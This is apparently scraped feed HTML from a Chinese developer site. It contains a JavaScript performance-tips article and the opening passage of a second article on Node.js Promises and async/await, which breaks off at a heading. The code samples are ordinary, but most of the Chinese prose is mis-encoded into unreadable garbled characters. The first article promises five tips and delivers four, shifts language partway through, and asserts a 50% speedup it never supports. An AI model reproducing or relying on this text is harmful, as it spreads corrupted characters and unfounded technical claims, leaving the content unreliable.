                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0"><strong>ä»æ··ä¹±åˆ°ä¼˜é›…ï¼šè¿™5ä¸ªç°ä»£JavaScriptæŠ€å·§è®©ä½ çš„ä»£ç æ€§èƒ½æå‡50%</strong></h3>
<h3 data-id="heading-1">å¼•è¨€</h3>
<p>åœ¨ç°ä»£Webå¼€å‘ä¸­ï¼ŒJavaScriptçš„æ€§èƒ½ä¼˜åŒ–ä¸€ç›´æ˜¯å¼€å‘è€…å…³æ³¨çš„é‡ç‚¹ã€‚éšç€åº”ç”¨ç¨‹åºå˜å¾—è¶Šæ¥è¶Šå¤æ‚ï¼Œä»£ç çš„æ•ˆç‡å’Œå¯ç»´æŠ¤æ€§ç›´æ¥å½±å“åˆ°ç”¨æˆ·ä½“éªŒå’Œå¼€å‘æ•ˆç‡ã€‚è®¸å¤šå¼€å‘è€…ä»ç„¶åœ¨ä½¿ç”¨è¿‡æ—¶çš„æ¨¡å¼æˆ–å†—ä½™çš„ä»£ç ç»“æ„ï¼Œè¿™ä¸ä»…é™ä½äº†æ€§èƒ½ï¼Œè¿˜å¢åŠ äº†ç»´æŠ¤æˆæœ¬ã€‚</p>
<p>æœ¬æ–‡å°†ä»‹ç»5ä¸ªç°ä»£JavaScriptæŠ€å·§ï¼Œè¿™äº›æŠ€å·§å¯ä»¥å¸®åŠ©ä½ ä»æ··ä¹±çš„ä»£ç è¿‡æ¸¡åˆ°ä¼˜é›…ã€é«˜æ•ˆçš„è§£å†³æ–¹æ¡ˆã€‚é€šè¿‡åˆç†çš„ä¼˜åŒ–ç­–ç•¥ï¼Œä½ å¯ä»¥æ˜¾è‘—æå‡ä»£ç æ€§èƒ½ï¼ˆç”šè‡³é«˜è¾¾50%ï¼‰ï¼ŒåŒæ—¶ä¿æŒä»£ç çš„å¯è¯»æ€§å’Œå¯æ‰©å±•æ€§ã€‚</p>
<hr/>
<h3 data-id="heading-2">1. ä½¿ç”¨<code>async/await</code>æ›¿ä»£å›è°ƒåœ°ç‹±</h3>
<h4 data-id="heading-3">é—®é¢˜ï¼šå›è°ƒåœ°ç‹±ä¸æ€§èƒ½æŸè€—</h4>
<p>ä¼ ç»Ÿçš„å›è°ƒæ¨¡å¼ï¼ˆCallbackï¼‰è™½ç„¶ç®€å•ï¼Œä½†åµŒå¥—è¿‡å¤šä¼šå¯¼è‡´â€œå›è°ƒåœ°ç‹±â€ï¼ˆCallback Hellï¼‰ï¼Œä¸ä»…éš¾ä»¥é˜…è¯»ï¼Œè¿˜å¯èƒ½å¼•å‘å†…å­˜æ³„æ¼å’Œæ€§èƒ½é—®é¢˜ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">getData</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) {
    <span class="hljs-title function_">processData</span>(data, <span class="hljs-keyword">function</span>(<span class="hljs-params">processedData</span>) {
        <span class="hljs-title function_">saveData</span>(processedData, <span class="hljs-keyword">function</span>(<span class="hljs-params">saved</span>) {
            <span class="hljs-comment">// æ›´å¤šåµŒå¥—...</span>
        });
    });
});
</code></pre>
<h4 data-id="heading-4">è§£å†³æ–¹æ¡ˆï¼š<code>async/await</code></h4>
<p>ES2017å¼•å…¥çš„<code>async/await</code>è¯­æ³•å¯ä»¥æ˜¾è‘—æ”¹å–„å¼‚æ­¥ä»£ç çš„å¯è¯»æ€§å’Œæ€§èƒ½ã€‚å®ƒåŸºäºPromiseå®ç°ï¼Œé¿å…äº†ä¸å¿…è¦çš„åµŒå¥—å’Œä¸Šä¸‹æ–‡åˆ‡æ¢å¼€é”€ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleData</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getData</span>();
    <span class="hljs-keyword">const</span> processedData = <span class="hljs-keyword">await</span> <span class="hljs-title function_">processData</span>(data);
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">saveData</span>(processedData);
}
</code></pre>
<h4 data-id="heading-5">æ€§èƒ½ä¼˜åŠ¿</h4>
<ul>
<li><strong>å‡å°‘å †æ ˆå¼€é”€</strong>ï¼šç›¸æ¯”å¤šå±‚åµŒå¥—çš„å›è°ƒï¼Œ<code>async/await</code>å‡å°‘äº†å‡½æ•°è°ƒç”¨å †æ ˆçš„æ·±åº¦ã€‚</li>
<li><strong>æ›´å¥½çš„é”™è¯¯å¤„ç†</strong>ï¼šé€šè¿‡<code>try/catch</code>å¯ä»¥ç»Ÿä¸€æ•è·é”™è¯¯ï¼Œé¿å…äº†å›è°ƒä¸­çš„æ‰‹åŠ¨é”™è¯¯ä¼ é€’ã€‚</li>
<li><strong>V8å¼•æ“ä¼˜åŒ–</strong>ï¼šç°ä»£JavaScriptå¼•æ“ï¼ˆå¦‚V8ï¼‰å¯¹<code>async/await</code>æœ‰ä¸“é—¨ä¼˜åŒ–ï¼Œæ‰§è¡Œæ•ˆç‡æ›´é«˜ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-6">2. åˆ©ç”¨WeakMapå’ŒWeakSetç®¡ç†å†…å­˜</h3>
<h4 data-id="heading-7">é—®é¢˜ï¼šå†…å­˜æ³„æ¼</h4>
<p>ä¼ ç»Ÿçš„Mapå’ŒSetä¼šå¼ºå¼•ç”¨é”®å€¼ï¼Œå¯¼è‡´å³ä½¿å¯¹è±¡ä¸å†éœ€è¦ä¹Ÿæ— æ³•è¢«åƒåœ¾å›æ”¶ï¼ˆGCï¼‰ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
<span class="hljs-keyword">function</span> <span class="hljs-title function_">processObj</span>(<span class="hljs-params">obj</span>) {
    <span class="hljs-keyword">if</span> (cache.<span class="hljs-title function_">has</span>(obj)) <span class="hljs-keyword">return</span> cache.<span class="hljs-title function_">get</span>(obj);
    <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">heavyComputation</span>(obj);
    cache.<span class="hljs-title function_">set</span>(obj, result); <span class="hljs-comment">// objä¼šè¢«é•¿æœŸæŒæœ‰</span>
    <span class="hljs-keyword">return</span> result;
}
</code></pre>
<h4 data-id="heading-8">è§£å†³æ–¹æ¡ˆï¼šWeakMapå’ŒWeakSet</h4>
<p>WeakMapå’ŒWeakSetçš„é”®æ˜¯å¼±å¼•ç”¨ï¼Œä¸ä¼šé˜»æ­¢åƒåœ¾å›æ”¶æœºåˆ¶å›æ”¶å¯¹è±¡ã€‚é€‚åˆç¼“å­˜æˆ–ä¸´æ—¶å…³è”æ•°æ®åœºæ™¯ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();
<span class="hljs-keyword">function</span> <span class="hljs-title function_">processObj</span>(<span class="hljs-params">obj</span>) {
    <span class="hljs-keyword">if</span> (cache.<span class="hljs-title function_">has</span>(obj)) <span class="hljs-keyword">return</span> cache.<span class="hljs-title function_">get</span>(obj);
    <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">heavyComputation</span>(obj);
    cache.<span class="hljs-title function_">set</span>(obj, result); <span class="hljs-comment">// objå¯è¢«GCå›æ”¶</span>
    <span class="hljs-keyword">return</span> result;
}
</code></pre>
<h4 data-id="heading-9">æ€§èƒ½ä¼˜åŠ¿</h4>
<ul>
<li><strong>å‡å°‘å†…å­˜å ç”¨</strong>ï¼šé¿å…æ— æ„çš„å†…å­˜æ³„æ¼ï¼Œå°¤å…¶æ˜¯åœ¨é•¿ç”Ÿå‘½å‘¨æœŸåº”ç”¨ä¸­ã€‚</li>
<li><strong>æ›´é«˜æ•ˆçš„GC</strong>ï¼šåƒåœ¾å›æ”¶å™¨èƒ½æ›´å¿«é‡Šæ”¾ä¸å†ä½¿ç”¨çš„å¯¹è±¡ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-10">3. ä½¿ç”¨Array.prototype.at()ç®€åŒ–æ•°ç»„è®¿é—®</h3>
<h4 data-id="heading-11">é—®é¢˜ï¼šå†—é•¿çš„è´Ÿæ•°ç´¢å¼•å¤„ç†</h4>
<p>ä¼ ç»Ÿçš„è´Ÿæ•°ç´¢å¼•éœ€è¦é€šè¿‡<code>arr.length + index</code>è®¡ç®—ï¼Œæ—¢ä¸ç›´è§‚åˆå®¹æ˜“å‡ºé”™ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-keyword">const</span> lastItem = arr[arr.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>]; <span class="hljs-comment">// 3</span>
</code></pre>
<h4 data-id="heading-12">è§£å†³æ–¹æ¡ˆï¼šArray.prototype.at()</h4>
<p>ES2022å¼•å…¥çš„<code>at()</code>æ–¹æ³•æ”¯æŒç›´æ¥ä½¿ç”¨è´Ÿæ•°ç´¢å¼•è®¿é—®æ•°ç»„å…ƒç´ ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> lastItem = arr.<span class="hljs-title function_">at</span>(-<span class="hljs-number">1</span>); <span class="hljs-comment">// 3</span>
</code></pre>
<h4 data-id="heading-13">æ€§èƒ½ä¼˜åŠ¿</h4>
<ul>
<li><strong>ä»£ç æ›´ç®€æ´</strong>ï¼šå‡å°‘å†—ä½™è®¡ç®—å’Œæ½œåœ¨çš„é”™è¯¯é£é™©ã€‚</li>
<li><strong>å¼•æ“ä¼˜åŒ–</strong>ï¼šç°ä»£æµè§ˆå™¨å¯¹å†…ç½®æ–¹æ³•è¿›è¡Œäº†é«˜åº¦ä¼˜åŒ–ï¼Œæ‰§è¡Œæ•ˆç‡æ›´é«˜ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-14">4. Object.groupByæ›¿ä»£æ‰‹åŠ¨åˆ†ç»„é€»è¾‘</h3>
<h4 data-id="heading-15">é—®é¢˜ï¼šä½æ•ˆçš„æ‰‹åŠ¨åˆ†ç»„</h4>
<p>å¼€å‘è€…é€šå¸¸ç”¨reduceæˆ–å¾ªç¯å®ç°åˆ†ç»„åŠŸèƒ½ï¼Œä½†è¿™ç±»æ‰‹åŠ¨å®ç°å¾€å¾€ä¸å¤Ÿé«˜æ•ˆä¸”éš¾ä»¥ç»´æŠ¤ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> users = [{ <span class="hljs-attr">age</span>:<span class="hljs-number">25</span> }, { <span class="hljs-attr">age</span>:<span class="hljs-number">30</span> }, { <span class="hljs-attr">age</span>:<span class="hljs-number">25</span> }];
<span class="hljs-keyword">const</span> groupedByAge = users.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, user</span>) =&gt;</span> {
    acc[user.<span class="hljs-property">age</span>] ??= [];
    acc[user.<span class="hljs-property">age</span>].<span class="hljs-title function_">push</span>(user);
    <span class="hljs-keyword">return</span> acc;
}, {});
</code></pre>
<h4 data-id="heading-16">ES2024æ–°ç‰¹æ€§ææ¡ˆä¸­çš„Object.groupByæ–¹æ³•å¯ä»¥ç›´æ¥å®Œæˆåˆ†ç»„æ“ä½œï¼š</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> groupedByAge = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">groupBy</span>(users , <span class="hljs-function">(<span class="hljs-params">{age}</span>) =&gt;</span> age ) ;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(groupedByAge )
<span class="hljs-comment">/* 
{
   "25": [{"age":25},{"age":25}],
   "30": [{"age":30}]
}
*/</span>
</code></pre>
<h5 data-id="heading-17">Performance Benefits:</h5>
<p>â€¢	Native Implementation Speed - No need for manual iteration logic that may be suboptimal.
â€¢	Cleaner Code - Readability is greatly improved over reduce-based approaches.
â€¢	Future Optimization Potential - As engines optimize this new API further.</p>
<hr/>
<h2 data-id="heading-18">Conclusion</h2>
<p>Mastering modern JavaScript features isnâ€™t just about writing cleaner code â€“ itâ€™s about unlocking significant performance gains while improving maintainability. The five techniques weâ€™ve covered demonstrate how evolving language features can help you:</p>
<ol>
<li>Replace callback hell with streamlined async/await workflows</li>
<li>Prevent memory leaks using WeakMap/WeakSet</li>
<li>Access array elements elegantly with at()</li>
<li>Leverage upcoming APIs like Object.groupBy for common operations</li>
</ol>
<p>Each optimization might seem small individually, but combined they can easily deliver the promised â‰¥50% performance improvement in real-world applications.</p>
<p>The key takeaway? Regularly update your JavaScript knowledge and challenge old patterns â€“ todayâ€™s â€œbest practiceâ€ might be tomorrowâ€™s performance bottleneck. By adopting these modern techniques proactively, youâ€™ll stay ahead of the curve while writing faster, more robust applications.</p>
<p>What modern JavaScript optimizations have you found most impactful? Share your experiences in the comments!</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js ç¼–ç¨‹å®æˆ˜æ·±å…¥ç†è§£Promiseä¸async&await]]></title>    <link>https://juejin.cn/post/7581698074362052617</link>    <guid>https://juejin.cn/post/7581698074362052617</guid>    <pubDate>2025-12-10T00:18:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581698074362052617" data-draft-id="7581888578507079707" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js ç¼–ç¨‹å®æˆ˜æ·±å…¥ç†è§£Promiseä¸async&amp;await"/> <meta itemprop="keywords" content="åç«¯,Node.js,Trae"/> <meta itemprop="datePublished" content="2025-12-10T00:18:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜çˆ±é’“é±¼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js ç¼–ç¨‹å®æˆ˜æ·±å…¥ç†è§£Promiseä¸async&amp;await
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜çˆ±é’“é±¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T00:18:46.000Z" title="Wed Dec 10 2025 00:18:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>åœ¨ Node.js çš„å¼‚æ­¥ç¼–ç¨‹ä½“ç³»ä¸­ï¼Œå›è°ƒå‡½æ•°è™½ç„¶ç®€å•é«˜æ•ˆï¼Œä½†ä¹Ÿå®¹æ˜“é€ æˆåµŒå¥—å¤æ‚ã€éš¾ä»¥ç»´æŠ¤çš„â€œå›è°ƒåœ°ç‹±â€é—®é¢˜ã€‚éšç€ JavaScript è¯­è¨€æ ‡å‡†çš„å‘å±•ï¼ŒPromise å’Œ async/await æˆä¸ºäº†ç°ä»£ Node.js å¼‚æ­¥ç¼–ç¨‹çš„ä¸»æµæ–¹å¼ã€‚åœ¨å·¥ç¨‹å®è·µä¸­ï¼Œå®ƒä»¬ä¸ä»…è®©ä»£ç æ›´æ¸…æ™°ï¼Œä¹Ÿæ›´æ˜“è°ƒè¯•å’Œæ‰©å±•ã€‚æœ¬æ–‡å°†ç³»ç»Ÿè§£æ Promise ä¸ async/await çš„æ ¸å¿ƒåŸç†ã€ä½¿ç”¨æ–¹å¼ä»¥åŠå®é™…å¼€å‘ä¸­çš„å¸¸è§æ¨¡å¼ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">ä¸€ã€Promiseï¼šè§£å†³å›è°ƒåœ°ç‹±çš„ç¬¬ä¸€æ­¥</h2>
<p>Promise æ˜¯ä¸€ç§ç”¨äºå¤„ç†å¼‚æ­¥æ“ä½œçš„å¯¹è±¡ï¼Œå®ƒä»£è¡¨çš„æ˜¯â€œæœªæ¥æŸä¸ªæ—¶é—´ç‚¹æ‰ä¼šè¿”å›çš„ç»“æœâ€ã€‚ç›¸æ¯”ä¼ ç»Ÿå›è°ƒï¼ŒPromise è®©å¼‚æ­¥æµç¨‹å¯ä»¥æ›´ä¼˜é›…åœ°ç»„ç»‡å’Œé“¾å¼è°ƒç”¨ã€‚</p>
<h3 data-id="heading-1">1. Promise çš„åŸºæœ¬è¯­æ³•</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">resolve</span>(<span class="hljs-string">"ä»»åŠ¡å®Œæˆ"</span>);
  }, <span class="hljs-number">1000</span>);
});

p.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">result</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result);
});
</code></pre>
<p>Promise çš„çŠ¶æ€åˆ†ä¸ºï¼š</p>
<ul>
<li>pendingï¼ˆè¿›è¡Œä¸­ï¼‰</li>
<li>fulfilledï¼ˆå·²æˆåŠŸï¼‰</li>
<li>rejectedï¼ˆå·²å¤±è´¥ï¼‰</li>
</ul>
<p>çŠ¶æ€ä¸€æ—¦æ”¹å˜ï¼Œå°±ä¸ä¼šå†æ¬¡å˜åŒ–ï¼Œè¿™è®©å¼‚æ­¥å¤„ç†æ›´ç¨³å®šã€‚</p>
<h3 data-id="heading-2">2. Promise é“¾å¼è°ƒç”¨</h3>
<p>å¤šä¸ªå¼‚æ­¥æ“ä½œå¯ä»¥é€šè¿‡ <code>.then()</code> ä¸²è”èµ·æ¥ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">doA</span>()
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">resultA</span> =&gt;</span> <span class="hljs-title function_">doB</span>(resultA))
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">resultB</span> =&gt;</span> <span class="hljs-title function_">doC</span>(resultB))
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">resultC</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(resultC))
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err));
</code></pre>
<p>è¿™ç§é“¾å¼ç»“æ„æœ‰æ•ˆè§£å†³äº†å›è°ƒçš„æ·±åº¦åµŒå¥—é—®é¢˜ã€‚</p>
<hr/>
<h2 data-id="heading-3">äºŒã€async/awaitï¼šå¼‚æ­¥ç¼–ç¨‹çš„ç»ˆæå½¢æ€</h2>
